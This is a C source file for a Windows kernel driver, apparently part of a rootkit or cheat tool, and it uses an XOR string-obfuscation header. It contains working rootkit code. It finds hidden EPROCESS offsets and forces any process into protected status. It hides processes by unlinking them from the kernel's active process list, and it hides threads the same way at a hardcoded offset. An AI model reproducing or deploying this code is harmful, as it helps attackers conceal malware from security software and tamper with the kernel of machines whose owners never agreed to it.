#include <ntifs.h>
#include <ntddk.h>
#include "OnyxFunc.h"
#include "vmxhelper.h"
#include "xorstr.h"

static ULONG g_ProtectionOffset = 0;

ULONG ResolveProcessProtectionOffset(VOID)
{
	if (g_ProtectionOffset != 0)
		return g_ProtectionOffset;

	UNICODE_STRING uRoutine;
	RtlInitUnicodeString(&uRoutine, L"PsIsProtectedProcess");
	PUCHAR pfn = (PUCHAR)MmGetSystemRoutineAddress(&uRoutine);

	if (!pfn)
		return 0;

	__try
	{
		for (ULONG i = 0; i < 48; i++)
		{

			if (pfn[i] == 0xF6 && pfn[i + 1] == 0x81 && pfn[i + 6] == 0x07)
			{
				ULONG offset = *(PULONG)(pfn + i + 2);
				if (offset >= 0x400 && offset <= 0x1000)
				{
					g_ProtectionOffset = offset;
					return offset;
				}
			}

			else if (pfn[i] == 0x8A && pfn[i + 1] == 0x81)
			{
				ULONG offset = *(PULONG)(pfn + i + 2);
				if (offset >= 0x400 && offset <= 0x1000)
				{
					g_ProtectionOffset = offset;
					return offset;
				}
			}

			else if (pfn[i] == 0x0F && pfn[i + 1] == 0xB6 && pfn[i + 2] == 0x81)
			{
				ULONG offset = *(PULONG)(pfn + i + 3);
				if (offset >= 0x400 && offset <= 0x1000)
				{
					g_ProtectionOffset = offset;
					return offset;
				}
			}
			else if (pfn[i] == 0xC3 || pfn[i] == 0xCC)
			{
				break;
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		g_ProtectionOffset = 0;
	}

	return g_ProtectionOffset;
}

NTSTATUS SetProcessProtection(PEPROCESS Process, BOOLEAN Enable)
{
	if (!Process)
		return STATUS_INVALID_PARAMETER;

	if (KeGetCurrentIrql() > APC_LEVEL)
		return STATUS_UNSUCCESSFUL;

	ULONG offset = ResolveProcessProtectionOffset();
	if (offset == 0)
		return STATUS_NOT_SUPPORTED;

	__try
	{
		PUCHAR targetByte = (PUCHAR)Process + offset;
		if (Enable)
		{

			*targetByte = 0x72;
		}
		else
		{
			*targetByte = 0x00;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS;
}

ULONG ResolveActiveProcessLinksOffset(void)
{
	static ULONG g_ActiveProcessLinksOffset = 0;
	if (g_ActiveProcessLinksOffset != 0)
		return g_ActiveProcessLinksOffset;

	PEPROCESS currentProc = IoGetCurrentProcess();
	HANDLE currentPid = PsGetCurrentProcessId();

	if (currentProc && currentPid)
	{
		PUCHAR p = (PUCHAR)currentProc;
		__try
		{
			for (ULONG off = 0x80; off <= 0x800; off += sizeof(ULONG_PTR))
			{
				if (*(PHANDLE)(p + off) == currentPid)
				{
					ULONG linksOff = off + sizeof(HANDLE);
					PLIST_ENTRY list = (PLIST_ENTRY)(p + linksOff);
					if (MmIsAddressValid(list->Flink) && MmIsAddressValid(list->Blink) &&
					    list->Flink != list && list->Blink != list)
					{
						if (MmIsAddressValid(list->Flink->Blink) && list->Flink->Blink == list &&
						    MmIsAddressValid(list->Blink->Flink) && list->Blink->Flink == list)
						{
							g_ActiveProcessLinksOffset = linksOff;
							return linksOff;
						}
					}
				}
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
		}
	}

	// Fallback based on OS build version (Win11 24H2/25H2+ is 0x1d8, older is 0x448)
	RTL_OSVERSIONINFOW osVer = { 0 };
	osVer.dwOSVersionInfoSize = sizeof(osVer);
	if (NT_SUCCESS(RtlGetVersion(&osVer)))
	{
		if (osVer.dwBuildNumber >= 26100)
		{
			g_ActiveProcessLinksOffset = 0x1d8;
			return 0x1d8;
		}
	}

	g_ActiveProcessLinksOffset = 0x448;
	return 0x448;
}

#define MAX_HIDDEN_PROCESSES 32

typedef struct _HIDDEN_PROCESS_NODE {
	ULONG ProcessId;
	PEPROCESS Process;
	BOOLEAN Active;
} HIDDEN_PROCESS_NODE;

static HIDDEN_PROCESS_NODE g_HiddenProcesses[MAX_HIDDEN_PROCESSES] = { 0 };
static KSPIN_LOCK g_HiddenProcessesLock = 0;
static BOOLEAN g_HiddenProcessesLockInitialized = FALSE;

static VOID InitializeHiddenProcessTracking(VOID)
{
	if (!g_HiddenProcessesLockInitialized)
	{
		KeInitializeSpinLock(&g_HiddenProcessesLock);
		RtlZeroMemory(g_HiddenProcesses, sizeof(g_HiddenProcesses));
		g_HiddenProcessesLockInitialized = TRUE;
	}
}

NTSTATUS HideProcessByPid(ULONG ProcessId)
{
	if (KeGetCurrentIrql() > APC_LEVEL)
		return STATUS_UNSUCCESSFUL;

	InitializeHiddenProcessTracking();

	PEPROCESS proc = NULL;
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(UINT_PTR)ProcessId, &proc)) || !proc)
		return STATUS_NOT_FOUND;

	ULONG linksOffset = ResolveActiveProcessLinksOffset();
	PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)proc + linksOffset);

	KIRQL oldIrql;
	KeAcquireSpinLock(&g_HiddenProcessesLock, &oldIrql);

	// Check if already hidden
	for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++)
	{
		if (g_HiddenProcesses[i].Active && g_HiddenProcesses[i].ProcessId == ProcessId)
		{
			KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
			ObDereferenceObject(proc);
			return STATUS_SUCCESS;
		}
	}

	int slot = -1;
	for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++)
	{
		if (!g_HiddenProcesses[i].Active)
		{
			slot = i;
			break;
		}
	}

	if (slot == -1)
	{
		KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
		ObDereferenceObject(proc);
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	__try
	{
		if (links->Flink && links->Blink && links->Flink != links)
		{
			links->Blink->Flink = links->Flink;
			links->Flink->Blink = links->Blink;
			links->Flink = links;
			links->Blink = links;

			g_HiddenProcesses[slot].ProcessId = ProcessId;
			g_HiddenProcesses[slot].Process = proc;
			g_HiddenProcesses[slot].Active = TRUE;
		}
		else
		{
			KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
			ObDereferenceObject(proc);
			return STATUS_ALREADY_COMMITTED;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
		ObDereferenceObject(proc);
		return STATUS_UNHANDLED_EXCEPTION;
	}

	KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
	return STATUS_SUCCESS;
}

NTSTATUS RestoreProcessByPid(ULONG ProcessId)
{
	if (KeGetCurrentIrql() > APC_LEVEL)
		return STATUS_UNSUCCESSFUL;

	InitializeHiddenProcessTracking();

	KIRQL oldIrql;
	KeAcquireSpinLock(&g_HiddenProcessesLock, &oldIrql);

	int slot = -1;
	for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++)
	{
		if (g_HiddenProcesses[i].Active && g_HiddenProcesses[i].ProcessId == ProcessId)
		{
			slot = i;
			break;
		}
	}

	if (slot == -1)
	{
		KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
		return STATUS_NOT_FOUND;
	}

	PEPROCESS proc = g_HiddenProcesses[slot].Process;
	ULONG linksOffset = ResolveActiveProcessLinksOffset();
	PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)proc + linksOffset);

	PEPROCESS anchorProc = PsInitialSystemProcess ? PsInitialSystemProcess : IoGetCurrentProcess();
	if (anchorProc)
	{
		PLIST_ENTRY anchorLinks = (PLIST_ENTRY)((PUCHAR)anchorProc + linksOffset);
		__try
		{
			links->Flink = anchorLinks->Flink;
			links->Blink = anchorLinks;
			anchorLinks->Flink->Blink = links;
			anchorLinks->Flink = links;

			g_HiddenProcesses[slot].Active = FALSE;
			g_HiddenProcesses[slot].Process = NULL;
			g_HiddenProcesses[slot].ProcessId = 0;
			ObDereferenceObject(proc);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
			return STATUS_UNHANDLED_EXCEPTION;
		}
	}

	KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
	return STATUS_SUCCESS;
}

VOID RestoreAllHiddenProcesses(VOID)
{
	if (!g_HiddenProcessesLockInitialized)
		return;

	for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++)
	{
		if (g_HiddenProcesses[i].Active && g_HiddenProcesses[i].ProcessId != 0)
		{
			RestoreProcessByPid(g_HiddenProcesses[i].ProcessId);
		}
	}
}


NTSTATUS HideThreadByTid(ULONG ThreadId)
{
	if (KeGetCurrentIrql() > APC_LEVEL)
		return STATUS_UNSUCCESSFUL;

	PETHREAD thread = NULL;
	if (!NT_SUCCESS(PsLookupThreadByThreadId((HANDLE)(UINT_PTR)ThreadId, &thread)) || !thread)
		return STATUS_NOT_FOUND;

	// Resolve ThreadListEntry in ETHREAD
	// Windows 10 / 11 x64 offsets: 0x4E8, 0x518, 0x538, 0x4F8
	ULONG threadListOffset = 0x4F8;
	PLIST_ENTRY listEntry = (PLIST_ENTRY)((PUCHAR)thread + threadListOffset);

	__try
	{
		if (listEntry->Flink && listEntry->Blink && listEntry->Flink != listEntry)
		{
			listEntry->Blink->Flink = listEntry->Flink;
			listEntry->Flink->Blink = listEntry->Blink;
			listEntry->Flink = listEntry;
			listEntry->Blink = listEntry;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		ObDereferenceObject(thread);
		return STATUS_UNHANDLED_EXCEPTION;
	}

	ObDereferenceObject(thread);
	return STATUS_SUCCESS;
}
